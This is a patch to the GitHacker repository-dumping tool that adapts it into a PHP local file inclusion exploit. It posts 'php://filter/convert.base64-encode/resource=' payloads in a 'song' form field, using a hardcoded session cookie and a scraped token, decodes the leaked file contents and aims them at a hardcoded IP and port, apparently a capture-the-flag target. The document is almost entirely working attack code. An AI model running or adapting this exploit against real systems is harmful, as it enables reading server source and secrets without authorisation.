@@ -1,0 +1,61 @@
+11a12
+> import base64
+35,38c36,39
+<         if requests.head("{}{}".format(self.url, ".git/")).status_code != 200:
+<             logging.error(
+<                 "The target url is not a valid git repository, `.git/HEAD` not exists")
+<             return
+---
+>         #if requests.head("{}{}".format(self.url, ".git/")).status_code != 200:
+>         #    logging.error(
+>         #        "The target url is not a valid git repository, `.git/HEAD` not exists")
+>         #    return
+265a267,272
+>     def get_token(self):
+>         cookies = {'PHPSESSID': '6d6b0e8b57c5cf8bc82d20146ba4f67b'}
+>         response = requests.get(self.url, cookies = cookies).text
+>         parsed_html = bs4.BeautifulSoup(response, features="html.parser")
+>         return parsed_html.find('input', attrs={'name': 'token'}).get('value')
+> 
+267c274,283
+<         response = requests.get(url)
+---
+>         file = url.replace(self.url, '')
+>         print(file)
+>         token = self.get_token()
+>         data = {'song': 'php://filter/convert.base64-encode/resource=' + file, 'token': token}
+>         cookies = {'PHPSESSID': '6d6b0e8b57c5cf8bc82d20146ba4f67b'}
+>         response = requests.post(self.url, data=data, cookies=cookies)
+>         if response.status_code != 200 or 'Warning' in response.text:
+>             return (404, 0, False)
+>         parsed_html = bs4.BeautifulSoup(response.text, features="html.parser")
+>         b64_str = parsed_html.find('pre').text
+273,274c289,290
+<         status_code = response.status_code
+<         content = response.content
+---
+>         status_code = 200
+>         content = base64.b64decode(b64_str)
+299,309d314
+<     parser = argparse.ArgumentParser(description='GitHacker')
+<     parser.add_argument('--url', required=True,
+<                         help='url of the target website which expose `.git` folder')
+<     parser.add_argument('--folder', required=True,
+<                         help='the local folder to store the git repository')
+<     parser.add_argument('--brute', required=False, action="store_true",
+<                         help='enable brute forcing branch/tag names')
+<     parser.add_argument('--threads', required=False, default=0x04,
+<                         type=int, help='threads number to download from internet')
+<     parser.add_argument('--version', action='version', version=__version__)
+<     args = parser.parse_args()
+311,315c316,319
+<         url=append_if_not_exists(remove_suffixes(
+<             args.url, ['.git', '.git/']), '/'),
+<         dst=args.folder,
+<         threads=args.threads,
+<         brute=args.brute,
+---
+>         url='http://61.28.237.24:30102/',
+>         dst='output',
+>         threads=1,
+>         brute=False,
